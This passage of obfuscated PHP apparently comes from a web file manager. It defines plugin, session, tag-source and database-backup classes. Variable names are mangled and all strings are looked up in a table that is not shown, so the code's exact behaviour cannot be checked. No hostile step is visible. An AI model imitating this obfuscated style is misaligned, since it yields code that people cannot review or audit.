$õ¢¸Ó³ö = !1; break; } } if ($õ¢¸Ó³ö) { $õÖš ß[] = $ñ†×’¤; } } if (!$õÖš ß) { return array(); } $Š»¤Ê´ = array($§ş¹¿ª[511] => array($§ş¹¿ª[512], $õÖš ß), $§ş¹¿ª[594] => $œğ²ÉÚÆ, $§ş¹¿ª[199] => SourceModel::TYPE_GROUP); $ô£ÑĞèé = Model($§ş¹¿ª[1477])->listSource($Š»¤Ê´); if (!$ô£ÑĞèé || count($õÖš ß) == $ô£ÑĞèé[$§ş¹¿ª[452]][$§ş¹¿ª[453]]) { return $ô£ÑĞèé; } $¾øÊ™™· = array(); $á¾â»•¯ = array_to_keyvalue($ô£ÑĞèé[$§ş¹¿ª[95]], $§ş¹¿ª[12], $§ş¹¿ª[202]); $ÉìÒ¯Î• = array_to_keyvalue($ô£ÑĞèé[$§ş¹¿ª[96]], $§ş¹¿ª[12], $§ş¹¿ª[202]); $Ü¿ñ¤„Ô = array_merge($ÉìÒ¯Î•, $á¾â»•¯); foreach ($õÖš ß as $§Õ·Éô) { if (!in_array($§Õ·Éô, $Ü¿ñ¤„Ô)) { $¾øÊ™™·[] = $§Õ·Éô; } } if ($¾øÊ™™·) { $this->removeBySource($œğ²ÉÚÆ, $¾øÊ™™·); } return $ô£ÑĞèé; } protected function addToTag($¨µ‚¡¶, $İ‰ğà³, $Úû–Ô§›) { $˜£‚³Ò =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->getByTagID($¨µ‚¡¶, $Úû–Ô§›) || !$İ‰ğà³) { return !1; } if (!Model($˜£‚³Ò[929])->pathInfo($İ‰ğà³)) { return !1; } $ºûØÂ¿Ø = array($˜£‚³Ò[1911] => 0, $˜£‚³Ò[578] => $Úû–Ô§›, $˜£‚³Ò[515] => $İ‰ğà³, $˜£‚³Ò[516] => $˜£‚³Ò[2245] . $¨µ‚¡¶, $˜£‚³Ò[514] => $˜£‚³Ò[12], $˜£‚³Ò[2130] => 0); if ($this->where($ºûØÂ¿Ø)->find()) { return !1; } return $this->add($ºûØÂ¿Ø); } protected function removeFromTag($õè‚î‰İ, $¯˜Ş¯ÕŒ, $§û¥ÍÅƒ) { $“ØÕÑ©Ô =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->getByTagID($õè‚î‰İ, $§û¥ÍÅƒ) || !$¯˜Ş¯ÕŒ) { return !1; } if (is_array($¯˜Ş¯ÕŒ)) { $¯˜Ş¯ÕŒ = array($“ØÕÑ©Ô[7], $¯˜Ş¯ÕŒ); } $¬ß¨¸† = array($“ØÕÑ©Ô[1911] => 0, $“ØÕÑ©Ô[578] => $§û¥ÍÅƒ, $“ØÕÑ©Ô[516] => $“ØÕÑ©Ô[2245] . $õè‚î‰İ, $“ØÕÑ©Ô[515] => $¯˜Ş¯ÕŒ); return $this->where($¬ß¨¸†)->delete(); } protected function removeByTag($ö‰›¯¯, $·ê³ıõ×) { $Ò§ûğ¾Ø =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->getByTagID($ö‰›¯¯, $·ê³ıõ×)) { return !1; } $ñÁ¾Ó¹¦ = array($Ò§ûğ¾Ø[1911] => 0, $Ò§ûğ¾Ø[578] => $·ê³ıõ×, $Ò§ûğ¾Ø[516] => $Ò§ûğ¾Ø[2245] . $ö‰›¯¯); return $this->where($ñÁ¾Ó¹¦)->delete(); } protected function removeBySource($õ¡½Â¼, $„ Èô·) { $»ğöË ä =& $_SERVER[ŒÅŸ‹ä†]; if (!$õ¡½Â¼ || !$„ Èô·) { return !1; } if (is_array($„ Èô·)) { $„ Èô· = array($»ğöË ä[7], $„ Èô·); } $ÜÚ¬ôµõ = array($»ğöË ä[1911] => 0, $»ğöË ä[515] => $„ Èô·, $»ğöË ä[578] => array($»ğöË ä[1125], 0), $»ğöË ä[516] => $»ğöË ä[2245] . $õ¡½Â¼); return $this->where($ÜÚ¬ôµõ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x70\154\165\x67\x69\156\114\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\x73\x74\141\x74\165\x73", "\162\x65\147\151\x65\x73\164", "\143\157\156\146\x69\x67"); public function loadList($†Ó¬ÕéÚ = false) { $¢¢¬’‰¸ = array_to_keyvalue($this->listData(), $_SERVER[ŒÅŸ‹ä†][42]); if ($†Ó¬ÕéÚ) { return $¢¢¬’‰¸[$†Ó¬ÕéÚ]; } return $¢¢¬’‰¸; } public function init() { $ºÁ’‚•› =& $_SERVER[ŒÅŸ‹ä†]; Hook::trigger($ºÁ’‚•›[2246]); $®¾™õãĞ = $this->loadPluginList(); foreach ($®¾™õãĞ as $÷¢€šçó => $Ñôö† Ò) { $µ‰ÕÚËê = $this->appAllow($÷¢€šçó, $Ñôö† Ò); if (!$µ‰ÕÚËê) { continue; } foreach ($Ñôö† Ò[$ºÁ’‚•›[2247]] as $ÁĞÙ°ƒ => $òİâƒšõ) { Hook::bind($ÁĞÙ°ƒ, $òİâƒšõ); } } Hook::trigger($ºÁ’‚•›[2248]); Hook::trigger(ACTION); } public function appAllow($‹É¥ä±û, $ß®£Ù‚, $åşÏ­˜„ = true) { $Ñäè›ñÒ =& $_SERVER[ŒÅŸ‹ä†]; $®¸éĞ÷š = PLUGIN_DIR . $‹É¥ä±û . $Ñäè›ñÒ[2249]; if (!is_array($ß®£Ù‚) || !is_array($ß®£Ù‚[$Ñäè›ñÒ[2247]]) || $ß®£Ù‚[$Ñäè›ñÒ[846]] != 1 || !is_file($®¸éĞ÷š)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ñäè›ñÒ[6]][$Ñäè›ñÒ[2250]] || !$GLOBALS[$Ñäè›ñÒ[6]][$Ñäè›ñÒ[2251]]) { return !0; } $œ”²óÈò = explode($Ñäè›ñÒ[60], strtolower($GLOBALS[$Ñäè›ñÒ[6]][$Ñäè›ñÒ[2251]])); return in_array(strtolower($‹É¥ä±û), $œ”²óÈò) ? !1 : !0; } if ($åşÏ­˜„ && !Action($Ñäè›ñÒ[2252])->checkAuth($‹É¥ä±û)) { return !1; } return !0; } public function unInstall($Š±¢ şæ) { $·™ò  =& $_SERVER[ŒÅŸ‹ä†]; $ßÎ¥“½” = $this->loadList($Š±¢ şæ); if (file_exists(PLUGIN_DIR . $Š±¢ şæ)) { Hook::apply($Š±¢ şæ . $·™ò [2253]); } $this->remove($ßÎ¥“½”[$·™ò [492]]); } public function changeStatus($°½ØŒçı, $Æ ¼îŞ) { $§ĞûÕÕ„ =& $_SERVER[ŒÅŸ‹ä†]; $³°´ ™ = $this->loadList($°½ØŒçı); if ($Æ ¼îŞ) { Hook::apply($°½ØŒçı . $§ĞûÕÕ„[2254]); } $this->update($³°´ ™[$§ĞûÕÕ„[492]], array($§ĞûÕÕ„[2255] => $Æ ¼îŞ)); } public function appRegist($ÍÜø¹×Å, $ÍâÈ°ĞÉ) { $óß‰ì½– =& $_SERVER[ŒÅŸ‹ä†]; $Ş¨‚í‡Ù = $this->loadList($ÍÜø¹×Å); if ($Ş¨‚í‡Ù) { $this->update($Ş¨‚í‡Ù[$óß‰ì½–[492]], array($óß‰ì½–[2247] => $ÍâÈ°ĞÉ)); } else { $ˆ¾†Æ² = array($óß‰ì½–[42] => $ÍÜø¹×Å, $óß‰ì½–[2247] => $ÍâÈ°ĞÉ, $óß‰ì½–[846] => 0, $óß‰ì½–[6] => $this->getConfigDefault($ÍÜø¹×Å)); $this->insert($ˆ¾†Æ²); } } public function getConfigDefault($ĞÆÏ×©É) { $†¥æŸ ã =& $_SERVER[ŒÅŸ‹ä†]; $ãï¦Öç… = array(); $ïô±«ú˜ = $this->getPackageJson($ĞÆÏ×©É); if (!$ïô±«ú˜ && is_array($ïô±«ú˜[$†¥æŸ ã[2256]])) { return $ãï¦Öç…; } foreach ($ïô±«ú˜[$†¥æŸ ã[2256]] as $´İË¢ÓÎ => $ÊÉê¤Ï) { if (!isset($ÊÉê¤Ï[$†¥æŸ ã[460]]) || isset($ãï¦Öç…[$´İË¢ÓÎ])) { continue; } $ãï¦Öç…[$´İË¢ÓÎ] = $ÊÉê¤Ï[$†¥æŸ ã[460]]; } return $ãï¦Öç…; } public function getPackageJson($ó×¥„´») { return Hook::apply($ó×¥„´» . $_SERVER[ŒÅŸ‹ä†][2257]); } public function getConfig($€Ö°¤Æ, $ù£­ç¬· = false) { $ ¤Ø„†İ =& $_SERVER[ŒÅŸ‹ä†]; $çä¥¥ü– = array(); $Çè˜‡ïÒ = $this->loadList($€Ö°¤Æ); if ($Çè˜‡ïÒ && is_array($Çè˜‡ïÒ[$ ¤Ø„†İ[6]])) { $çä¥¥ü– = $Çè˜‡ïÒ[$ ¤Ø„†İ[6]]; } if (!$çä¥¥ü– || $ù£­ç¬·) { $çä¥¥ü– = $this->getConfigDefault($€Ö°¤Æ); } return $çä¥¥ü–; } public function setConfig($†Œ·ƒ, $ºêêö“ = false) { $ñ ¢³ùØ =& $_SERVER[ŒÅŸ‹ä†]; $ÇÉÛ¶° = $this->loadList($†Œ·ƒ); if (!$ÇÉÛ¶°) { return !1; } $Üù¶øĞÎ = $ÇÉÛ¶°[$ñ ¢³ùØ[6]]; if ($ºêêö“ == !1) { $Üù¶øĞÎ = array(); $ºêêö“ = $this->getConfigDefault($†Œ·ƒ); } foreach ($ºêêö“ as $ïùÃºúâ => $™¿£ËóÌ) { $Üù¶øĞÎ[$ïùÃºúâ] = is_string($™¿£ËóÌ) ? trim($™¿£ËóÌ) : $™¿£ËóÌ; } $this->update($ÇÉÛ¶°[$ñ ¢³ùØ[492]], array($ñ ¢³ùØ[6] => $Üù¶øĞÎ)); } public function viewList() { $ˆ¨ÊûÔ” =& $_SERVER[ŒÅŸ‹ä†]; $…õƒŸª÷ = $this->loadList(); $this->pluginScan($…õƒŸª÷); $…õƒŸª÷ = $this->loadPluginList(); $“äïç€í = array(); foreach ($…õƒŸª÷ as $èä­ÕÆ¥ => $€”ªª¡Ä) { $“Ğş¥§ = $€”ªª¡Ä; unset($€”ªª¡Ä[$ˆ¨ÊûÔ”[2247]], $€”ªª¡Ä[$ˆ¨ÊûÔ”[6]]); $¿£ûÈ¥˜ = PLUGIN_DIR . $€”ªª¡Ä[$ˆ¨ÊûÔ”[42]] . $ˆ¨ÊûÔ”[2249]; if (!is_file($¿£ûÈ¥˜)) { continue; } $öéù¥üÇ = Hook::apply($€”ªª¡Ä[$ˆ¨ÊûÔ”[42]] . $ˆ¨ÊûÔ”[2257]); if (!is_array($öéù¥üÇ)) { continue; } $“äïç€í[$èä­ÕÆ¥] = array_merge($€”ªª¡Ä, $öéù¥üÇ); if ($“Ğş¥§[$ˆ¨ÊûÔ”[6]][$ˆ¨ÊûÔ”[1833]] != $öéù¥üÇ[$ˆ¨ÊûÔ”[1807]]) { Hook::apply($€”ªª¡Ä[$ˆ¨ÊûÔ”[42]] . $ˆ¨ÊûÔ”[2254]); $“Ğş¥§[$ˆ¨ÊûÔ”[6]][$ˆ¨ÊûÔ”[1833]] = $öéù¥üÇ[$ˆ¨ÊûÔ”[1807]]; $this->update($€”ªª¡Ä[$ˆ¨ÊûÔ”[492]], array($ˆ¨ÊûÔ”[6] => $“Ğş¥§[$ˆ¨ÊûÔ”[6]])); } } return $“äïç€í; } private function loadPluginList() { $»Ò¤ì =& $_SERVER[ŒÅŸ‹ä†]; $ı›ıÏ¹Ü = $this->loadList(); if (strtolower(MOD) == $»Ò¤ì[2258]) { return $ı›ıÏ¹Ü; } $Éä–…¹ = Hook::trigger($»Ò¤ì[2259], $ı›ıÏ¹Ü); if ($ı›ıÏ¹Ü && !$Éä–…¹) { die; } return $Éä–…¹ ? $Éä–…¹ : $ı›ıÏ¹Ü; } private function pluginScan($éĞÜ›¦‚) { $ú”åèÔï =& $_SERVER[ŒÅŸ‹ä†]; recursion_dir(PLUGIN_DIR, $ª¿ø»Õâ, $ØÛõ¤ùÑ, 0); foreach ($ª¿ø»Õâ as $é˜İ®Î) { $±©ÕÍçä = get_path_this($é˜İ®Î); if (isset($éĞÜ›¦‚[$±©ÕÍçä]) || !file_exists($é˜İ®Î . $ú”åèÔï[2260]) || !file_exists($é˜İ®Î . $ú”åèÔï[2249])) { continue; } Hook::apply($±©ÕÍçä . $ú”åèÔï[2254]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\137\163\145\x73\163\x69\x6f\156"; public function get($Ê˜¨¸—) { $ßÌãœü± =& $_SERVER[ŒÅŸ‹ä†]; $´‚€¥ƒ’ = $this->where(array($ßÌãœü±[2261] => $Ê˜¨¸—))->find(); if (!is_array($´‚€¥ƒ’)) { return !1; } return $´‚€¥ƒ’[$ßÌãœü±[179]]; } public function set($¹¥ŸÄıİ, $ó¤’’Âø, $œ½Í·ôş = 3600) { $›öıØØ =& $_SERVER[ŒÅŸ‹ä†]; $§––™×• = array($›öıØØ[2261] => $¹¥ŸÄıİ, $›öıØØ[2164] => $ó¤’’Âø, $›öıØØ[2262] => $œ½Í·ôş + time()); if (Session::get($›öıØØ[2263])) { $§––™×•[$›öıØØ[1537]] = Session::get($›öıØØ[2263]); } else { $§––™×•[$›öıØØ[1537]] = 0; } if ($this->get($¹¥ŸÄıİ)) { return $this->where(array($›öıØØ[2261] => $¹¥ŸÄıİ))->save($§––™×•); } else { return $this->add($§––™×•, array(), !0); } } public function remove($Š‹×ş‡…) { return $this->where(array($_SERVER[ŒÅŸ‹ä†][2261] => $Š‹×ş‡…))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ŒÅŸ‹ä†][2264] . time())->delete(); } } goto AÑÌ´ƒ”á; eƒ²ø½óÂ¡: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ŒÅŸ‹ä†][844]); $this->init(); $this->keep(); } public function init() { $ÎœÇòøæ =& $_SERVER[ŒÅŸ‹ä†]; $this->isManual(); self::$name = date($ÎœÇòøæ[845]); if (!($‡½öÚÏ = $this->model->lastItem())) { $‡½öÚÏ = $this->initData(); } else { self::$name = $‡½öÚÏ[$ÎœÇòøæ[42]]; if ($‡½öÚÏ[$ÎœÇòøæ[846]] == $ÎœÇòøæ[101]) { self::$name = date($ÎœÇòøæ[270]); $œÁ§æƒÑ = intval(_get($‡½öÚÏ, $ÎœÇòøæ[847], 0)); if (self::$manual == 0 && $‡½öÚÏ[$ÎœÇòøæ[42]] == self::$name) { $this->model->remove($‡½öÚÏ[$ÎœÇòøæ[492]]); } $‡½öÚÏ = $this->initData($œÁ§æƒÑ, $‡½öÚÏ[$ÎœÇòøæ[848]]); } else { $this->checkStore($‡½öÚÏ[$ÎœÇòøæ[848]]); } } self::$option = $‡½öÚÏ; } private function isManual() { $Ù¨†§Úå = _get($GLOBALS, $_SERVER[ŒÅŸ‹ä†][849], 0); $Ù¨†§Úå = intval($Ù¨†§Úå); self::$manual = $Ù¨†§Úå && $Ù¨†§Úå == 1 ? 1 : 0; } private function initData($·Ëü“— = 0, $Ä±·õĞ = '') { $ûŞ¶ì¤Ş =& $_SERVER[ŒÅŸ‹ä†]; $ò¯…ÒÑ = $this->model->config(); if ($Ä±·õĞ && $ò¯…ÒÑ[$ûŞ¶ì¤Ş[848]] != $Ä±·õĞ) { $·Ëü“— = 0; } $this->checkStore($ò¯…ÒÑ[$ûŞ¶ì¤Ş[848]]); if (self::$manual == 1) { self::$name .= $ûŞ¶ì¤Ş[11] . date($ûŞ¶ì¤Ş[850]); } $ÍÇ•©€¯ = array($ûŞ¶ì¤Ş[848] => $ò¯…ÒÑ[$ûŞ¶ì¤Ş[848]], $ûŞ¶ì¤Ş[42] => self::$name, $ûŞ¶ì¤Ş[846] => 0, $ûŞ¶ì¤Ş[179] => $ò¯…ÒÑ[$ûŞ¶ì¤Ş[179]], $ûŞ¶ì¤Ş[851] => self::$manual, $ûŞ¶ì¤Ş[852] => array($ûŞ¶ì¤Ş[853] => array($ûŞ¶ì¤Ş[846] => 0), $ûŞ¶ì¤Ş[854] => array($ûŞ¶ì¤Ş[846] => 0, $ûŞ¶ì¤Ş[855] => 0, $ûŞ¶ì¤Ş[856] => 0, $ûŞ¶ì¤Ş[43] => $ûŞ¶ì¤Ş[12], $ûŞ¶ì¤Ş[857] => 0, $ûŞ¶ì¤Ş[858] => 0), $ûŞ¶ì¤Ş[859] => array($ûŞ¶ì¤Ş[846] => 0, $ûŞ¶ì¤Ş[855] => 0, $ûŞ¶ì¤Ş[856] => 0, $ûŞ¶ì¤Ş[857] => 0, $ûŞ¶ì¤Ş[858] => 0), $ûŞ¶ì¤Ş[241] => array($ûŞ¶ì¤Ş[846] => 0, $ûŞ¶ì¤Ş[860] => 0, $ûŞ¶ì¤Ş[861] => 0, $ûŞ¶ì¤Ş[862] => 0, $ûŞ¶ì¤Ş[863] => 0, $ûŞ¶ì¤Ş[562] => $·Ëü“—, $ûŞ¶ì¤Ş[857] => 0, $ûŞ¶ì¤Ş[858] => 0)), $ûŞ¶ì¤Ş[857] => time(), $ûŞ¶ì¤Ş[858] => 0); $ŞõüÏû“ = $this->model->insert($ÍÇ•©€¯); $ÍÇ•©€¯[$ûŞ¶ì¤Ş[492]] = $ŞõüÏû“; return $ÍÇ•©€¯; } private function checkStore($î¦»åà´) { $íˆ²¾ = Model($_SERVER[ŒÅŸ‹ä†][864]); $à óó¸‘ = $íˆ²¾->listData($î¦»åà´); $íˆ²¾->checkConfig($à óó¸‘); } public static function get() { if (!self::$option) { $“ÅŞŸü§ = Model($_SERVER[ŒÅŸ‹ä†][844]); $êÌ¡õÇ = $“ÅŞŸü§->findByName(self::$name); $“ÅŞŸü§->parseContent($êÌ¡õÇ); self::$option = $êÌ¡õÇ; } return self::$option; } public static function set($Î¥‹•’¨) { $à«Şşù =& $_SERVER[ŒÅŸ‹ä†]; $¼¹×µü” = self::get(); foreach ($Î¥‹•’¨ as $ÇÃˆÆï¤ => $Ò­ä°¬û) { array_set_value($¼¹×µü”, $ÇÃˆÆï¤, $Ò­ä°¬û); } Model($à«Şşù[844])->update($¼¹×µü”[$à«Şşù[492]], $¼¹×µü”); self::$option = $¼¹×µü”; return self::$option; } public function keep() { $ÔŞ·âãû =& $_SERVER[ŒÅŸ‹ä†]; $ø¶˜Ô¾Á = self::get(); if (_get($ø¶˜Ô¾Á, $ÔŞ·âãû[865], 0) == $ÔŞ·âãû[101]) { return; } $this->backupKeep($ø¶˜Ô¾Á); self::set(array($ÔŞ·âãû[865] => 1)); } private function backupKeep($úØÂ ) { $¯Êâ³ºı =& $_SERVER[ŒÅŸ‹ä†]; if (self::$manual == 1) { return; } $ğ´ ğ×İ = $this->model->listData(); if (empty($ğ´ ğ×İ)) { return; } $Ë€˜èÓ = array(); $üÔ»ºÛ = array(); $œÓÃ¬»‚ = date($¯Êâ³ºı[866], strtotime($¯Êâ³ºı[867])); foreach ($ğ´ ğ×İ as $“©…¥œÆ => $­Îí½¼À) { $¨¡¼Ÿ°ñ = $­Îí½¼À[$¯Êâ³ºı[42]]; if ($“©…¥œÆ < 7 || $­Îí½¼À[$¯Êâ³ºı[851]] == $¯Êâ³ºı[101]) { $Ë€˜èÓ[] = $¨¡¼Ÿ°ñ; continue; } $´‘ƒôöĞ = substr($¨¡¼Ÿ°ñ, 0, 6); if ($´‘ƒôöĞ < $œÓÃ¬»‚) { continue; } if (!isset($üÔ»ºÛ[$´‘ƒôöĞ]) || $¨¡¼Ÿ°ñ < $üÔ»ºÛ[$´‘ƒôöĞ]) { $üÔ»ºÛ[$´‘ƒôöĞ] = $¨¡¼Ÿ°ñ; } if (substr($¨¡¼Ÿ°ñ, 6, 2) == $¯Êâ³ºı[868]) { $üÔ»ºÛ[$´‘ƒôöĞ] = $¨¡¼Ÿ°ñ; } } $Ë€˜èÓ = array_merge($Ë€˜èÓ, array_values($üÔ»ºÛ)); $Ë€˜èÓ = array_unique($Ë€˜èÓ); foreach ($ğ´ ğ×İ as $­Îí½¼À) { $¨¡¼Ÿ°ñ = $­Îí½¼À[$¯Êâ³ºı[42]]; if (!empty($¨¡¼Ÿ°ñ) && in_array($¨¡¼Ÿ°ñ, $Ë€˜èÓ)) { continue; } $this->model->remove($­Îí½¼À[$¯Êâ³ºı[492]]); $±Àªø— = $this->backupPath($úØÂ ); IO::remove($±Àªø—, !1); } } private function backupPath($È– Ï©„) { $å²¦ÕÏ =& $_SERVER[ŒÅŸ‹ä†]; static $»ï¹ÓÓÎ = null; if (is_null($»ï¹ÓÓÎ)) { $»ï¹ÓÓÎ = Model($å²¦ÕÏ[869])->get($å²¦ÕÏ[870]); } $ªõÓığä = $È– Ï©„[$å²¦ÕÏ[42]]; $ú¾Ã¡ØÊ = substr(md5($å²¦ÕÏ[871] . $»ï¹ÓÓÎ . $ªõÓığä), 0, 8); return "\x7b\x69\157\72{$È– Ï©„[$å²¦ÕÏ[848]]}\175\x2f\144\x61\164\141\x62\141\163\145\x2f\x62\141\x63\x6b\x75\x70\57" . $ªõÓığä . $å²¦ÕÏ[11] . $ú¾Ã¡ØÊ; } public function db() { $ÖÈ¡îÒ =& $_SERVER[ŒÅŸ‹ä†]; $™ßöû•‰ = self::get(); if (_get($™ßöû•‰, $ÖÈ¡îÒ[872], 0) == $ÖÈ¡îÒ[101]) { return !0; } $óğ½Öé¨ = new BackupDb(); if (!$óğ½Öé¨->index()) { return !1; } self::set(array($ÖÈ¡îÒ[872] => 1)); return !0; } public function dbFile() { $†È…ÒÑ½ =& $_SERVER[ŒÅŸ‹ä†]; $şÆÒÀäÀ = self::get(); if (_get($şÆÒÀäÀ, $†È…ÒÑ½[873], 0) == $†È…ÒÑ½[101]) { return !0; } $Ïë°‡ŸÕ = new BackupDbFile(); if (!$Ïë°‡ŸÕ->index()) { return !1; } self::set(array($†È…ÒÑ½[873] => 1)); return !0; } public function file() { $Š¶³æç„ =& $_SERVER[ŒÅŸ‹ä†]; $®âôíŒ¿ = self::get(); if (_get($®âôíŒ¿, $Š¶³æç„[874], 0) == $Š¶³æç„[101]) { return !0; } if ($®âôíŒ¿[$Š¶³æç„[179]] == $Š¶³æç„[875]) { $œùË¬¦£ = new BackupFile(); if (!$œùË¬¦£->index()) { return !1; } } self::set(array($Š¶³æç„[874] => 1, $Š¶³æç„[846] => 1)); return !0; } public static function log($÷«°‚‚Ê) { write_log($÷«°‚‚Ê, $_SERVER[ŒÅŸ‹ä†][876]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Œ˜•ˆÕ =& $_SERVER[ŒÅŸ‹ä†]; $ÂÜøŠ‰ = Backup::get(); self::$io = $ÂÜøŠ‰[$Œ˜•ˆÕ[848]]; self::$name = $ÂÜøŠ‰[$Œ˜•ˆÕ[42]]; $Ï¨Úï™ï = new DbManage(); $Ÿƒì¨ã× = $Ï¨Úï™ï->dbType(); $”Ôçª¼™ = array($Œ˜•ˆÕ[877] => $Ÿƒì¨ã×, $Œ˜•ˆÕ[878] => time()); Backup::set($”Ôçª¼™); $…˜ù™Êî = $this->tmpFilesPath() . $Œ˜•ˆÕ[879] . self::$name . $Œ˜•ˆÕ[8]; del_dir($…˜ù™Êî); mk_dir($…˜ù™Êî); $êé¿±ã = $ßÎÌêñ÷ = 0; try { $½ãÉ¯ÂÅ = $Ï¨Úï™ï->db()->getTables(); } catch (Exception $ÏÓô†ÛÒ) { Backup::log($Œ˜•ˆÕ[880] . $ÏÓô†ÛÒ->getMessage()); return !1; } $½ãÉ¯ÂÅ = array_diff($½ãÉ¯ÂÅ, array($Œ˜•ˆÕ[881], $Œ˜•ˆÕ[882])); foreach ($½ãÉ¯ÂÅ as $Ÿ×‡£­Ş) { if ($Ÿ×‡£­Ş == $Œ˜•ˆÕ[883]) { continue; } $êé¿±ã += $Ï¨Úï™ï->model($Ÿ×‡£­Ş)->count(); } $óæÉû“ = new Task($Œ˜•ˆÕ[884], $Œ˜•ˆÕ[876], $êé¿±ã, LNG($Œ˜•ˆÕ[885]) . $Œ˜•ˆÕ[886] . LNG($Œ˜•ˆÕ[887])); $GLOBALS[$Œ˜•ˆÕ[888]] = self::$name; foreach ($½ãÉ¯ÂÅ as $Ÿ×‡£­Ş) { $”·ûó¹Í = $…˜ù™Êî . $Ÿ×‡£­Ş . $Œ˜•ˆÕ[889]; if ($Ÿ×‡£­Ş == $Œ˜•ˆÕ[883]) { @touch($”·ûó¹Í); continue; } $ ÷Åè·´ = null; if ($Ÿ×‡£­Ş == $Œ˜•ˆÕ[890] && $ÂÜøŠ‰[$Œ˜•ˆÕ[179]] == $Œ˜•ˆÕ[875]) { $ ÷Åè·´ = self::$io; } $ßÎÌêñ÷ += $Ï¨Úï™ï->sqlFromDb($Ÿ×‡£­Ş, $”·ûó¹Í, $óæÉû“, $ ÷Åè·´); } unset($GLOBALS[$Œ˜•ˆÕ[888]]); $óæÉû“->end(); if ($ßÎÌêñ÷ > $êé¿±ã) { $êé¿±ã = $ßÎÌêñ÷; } $”Ôçª¼™ = array($Œ˜•ˆÕ[877] => $Ÿƒì¨ã×, $Œ˜•ˆÕ[872] => 1, $Œ˜•ˆÕ[891] => $êé¿±ã, $Œ˜•ˆÕ[892] => $ßÎÌêñ÷, $Œ˜•ˆÕ[893] => time()); Backup::set($”Ôçª¼™); if ($êé¿±ã - $ßÎÌêñ÷ > 0) { $ˆŞ¿–ñ› = $Œ˜•ˆÕ[894]; if (!stristr(I18n::getType(), $Œ˜•ˆÕ[895])) { $ˆŞ¿–ñ› = $Œ˜•ˆÕ[896]; } Backup::log(array($ˆŞ¿–ñ›, $”Ôçª¼™)); return !1; } return !0; } private function tmpFilesPath() { $âÀüÀ£ò =& $_SERVER[ŒÅŸ‹ä†]; $î¯¢û« = TEMP_FILES; if ($GLOBALS[$âÀüÀ£ò[6]][$âÀüÀ£ò[102]][$âÀüÀ£ò[897]]) { $î¯¢û« = $GLOBALS[$âÀüÀ£ò[6]][$âÀüÀ£ò[102]][$âÀüÀ£ò[897]]; if (!mk_dir($î¯¢û«) || !is_writable($î¯¢û«) || !IO::mkfile($î¯¢û« . $âÀüÀ£ò[898])) { $î¯¢û« = TEMP_FILES; } } return $î¯¢û«; } } class BackupDbFile { public function __construct() { } public function index() { $õÔ¨ƒŠº =& $_SERVER[ŒÅŸ‹ä†]; $Ô¶½Ûè = Backup::get(); $šÂìÎ’» = $Ô¶½Ûè[$õÔ¨ƒŠº[42]]; $Ì¯¶İŠá = $this->tmpFilesPath() . "\142\x61\x63\x6b\x75\x70\x5f{$šÂìÎ’»}\x2f"; $Òãé‘¶¡ = $this->backupPath($Ô¶½Ûè); if (!($Òãé‘¶¡ = IO::mkdir($Òãé‘¶¡))) { Backup::log($õÔ¨ƒŠº[899] . $Òãé‘¶¡); return !1; } $ó¯Ëó = new DbManage(); $‹Ù™˜¾š = $ó¯Ëó->getSqlFile(); if (!$‹Ù™˜¾š || !$‹Ù™˜¾š[$õÔ¨ƒŠº[900]] || !$‹Ù™˜¾š[$õÔ¨ƒŠº[23]]) { Backup::log($õÔ¨ƒŠº[901]); return !1; } IO::move($‹Ù™˜¾š[$õÔ¨ƒŠº[900]], $Ì¯¶İŠá); IO::move($‹Ù™˜¾š[$õÔ¨ƒŠº[23]], $Ì¯¶İŠá); $ó¯Ëó->mixBakList($Ì¯¶İŠá); $ôÖÕåçî = IO::listPath($Ì¯¶İŠá); $“‡ûßË = isset($ôÖÕåçî[$õÔ¨ƒŠº[96]]) ? $ôÖÕåçî[$õÔ¨ƒŠº[96]] : array(); $¶ÕßİäÉ = array_sum(array_column($“‡ûßË, $õÔ¨ƒŠº[89])); if (!$¶ÕßİäÉ) { Backup::log($õÔ¨ƒŠº[902] . $Ì¯¶İŠá); return !1; } $ığ¨á = array($õÔ¨ƒŠº[903] => $¶ÕßİäÉ, $õÔ¨ƒŠº[904] => time()); Backup::set($ığ¨á); Hook::trigger($õÔ¨ƒŠº[905], $Ì¯¶İŠá, $Òãé‘¶¡); $Éöæ”ı° = new TaskFileTransfer($õÔ¨ƒŠº[905], $õÔ¨ƒŠº[876], count($“‡ûßË), LNG($õÔ¨ƒŠº[885]) . $õÔ¨ƒŠº[482] . LNG($õÔ¨ƒŠº[887]) . $õÔ¨ƒŠº[906]); $Éöæ”ı°->task[$õÔ¨ƒŠº[860]] = $¶ÕßİäÉ; foreach ($ôÖÕåçî[$õÔ¨ƒŠº[96]] as $á¹ÊÕ) { $‰·ŸµÅ› = IO::move($á¹ÊÕ[$õÔ¨ƒŠº[97]], $Òãé‘¶¡); if (!$‰·ŸµÅ›) { $Éöæ”ı°->end(); $ÔøÈó÷ = IO::getLastError($õÔ¨ƒŠº[907] . $á¹ÊÕ[$õÔ¨ƒŠº[97]] . $õÔ¨ƒŠº[908] . $Òãé‘¶¡ . $õÔ¨ƒŠº[186]); Backup::log($ÔøÈó÷); return !1; } } $Éöæ”ı°->end(); $ığ¨á = array($õÔ¨ƒŠº[909] => $¶ÕßİäÉ, $õÔ¨ƒŠº[910] => time()); Backup::set($ığ¨á); return !0; } private function backupPath($Êé…Š±Œ) { $²½ı³¯ =& $_SERVER[ŒÅŸ‹ä†]; $Åªßİ­Ê = $Êé…Š±Œ[$²½ı³¯[42]]; $ÖĞÙÆ…­ = Model($²½ı³¯[869])->get($²½ı³¯[870]); $‚è¹øç = substr(md5($²½ı³¯[871] . $ÖĞÙÆ…­ . $Åªßİ­Ê), 0, 8); return "\x7b\x69\157\72{$Êé…Š±Œ[$²½ı³¯[848]]}\175\57\144\x61\164\141\x62\141\163\145\x2f\142\x61\143\153\x75\x70\x2f" . $Åªßİ­Ê . $²½ı³¯[11] . $‚è¹øç; } private function tmpFilesPath() { $ËŞÛĞ‰ =& $_SERVER[ŒÅŸ‹ä†]; $×óÕ” = TEMP_FILES; if 